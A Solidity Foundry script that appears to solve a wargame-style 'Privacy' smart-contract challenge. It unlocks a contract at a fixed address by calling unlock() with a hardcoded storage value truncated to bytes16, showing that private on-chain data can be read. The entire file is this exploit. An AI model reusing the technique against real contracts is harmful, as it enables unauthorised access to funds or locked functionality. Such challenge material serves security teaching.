// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Privacy.sol";
import {Script} from "forge-std/Script.sol";

contract PrivacyAttack is Script {
    Privacy public privacy = Privacy(0xb1e0126336DF80Bd6f56e030f4014725Bd457c72);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        bytes32 data = 0x4548d4886a8a43ce96d028e78a0b5a084b520746de78cd076766007e1b7fb7f3;

        privacy.unlock(bytes16(data));

        vm.stopBroadcast();
    }
}